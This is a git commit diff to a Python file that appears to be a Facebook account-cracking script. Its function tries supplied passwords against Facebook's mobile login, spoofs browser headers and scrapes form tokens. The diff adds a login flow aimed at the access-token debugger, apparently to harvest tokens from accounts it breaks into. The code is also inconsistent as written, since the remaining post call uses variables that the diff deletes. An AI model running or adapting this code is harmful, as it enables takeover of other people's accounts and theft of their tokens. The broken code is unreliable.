e4cc4a802a894428178226cef49516133f18e2b4
SHANTO-KING <143583631+SHANTO-KING@users.noreply.github.com>
2023-10-20 05:43:09 +0600

    Add files via upload

--- testing.py
+++ testing.py
@@ -262,39 +262,47 @@ def b(uid,pwx,tl):
             pro = random.choice(ugen)
             #oo=random.choice(sss)
             free_fb = session.get('https://p.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-                'method': 'GET',
-                'path': '/login/device-based/login/async/',
-                'scheme': 'https',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-                'cache-control': 'max-age=0',
-                'dpr': '2',
-                'sec-ch-prefers-color-scheme': 'dark',
-                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-model': '"TECNO KE7"',
-                'sec-ch-ua-platform': '"Android"',
-                'sec-ch-ua-platform-version': '"10.0.0"',
-                'sec-fetch-dest': 'document',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'none',
-                'sec-fetch-user': '?1',
-                'upgrade-insecure-requests': '1',
-                'user-agent': pro,
-                'viewport-width': '980',
-}
+            header = {
+                    "Host":cebok,
+                    "upgrade-insecure-requests":"1",
+                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "dnt":"1",
+                    "x-requested-with":"mark.via.gp",
+                    "sec-fetch-site":"same-origin",
+                    "sec-fetch-mode":"cors",
+                    "sec-fetch-user":"empty",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://m.facebook.com/",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+                }
+                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
+                das = {
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+                    "uid":user,
+                    "flow":"login_no_pin",
+                    "pass":pw,
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+                }
+                header1 = {
+                    "Host":cebok,
+                    "cache-control":"max-age=0",
+                    "upgrade-insecure-requests":"1",
+                    "origin":"https://"+cebok,
+                    "content-type":"application/x-www-form-urlencoded",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
+                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                    "x-requested-with":"XMLHttpRequest",
+                    "sec-fetch-site":"same-origin",
+                    "sec-fetch-mode":"cors",
+                    "sec-fetch-user":"empty",
+                    "sec-fetch-dest":"document",
+                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
+                    "accept-encoding":"gzip, deflate br",
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
+                }
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
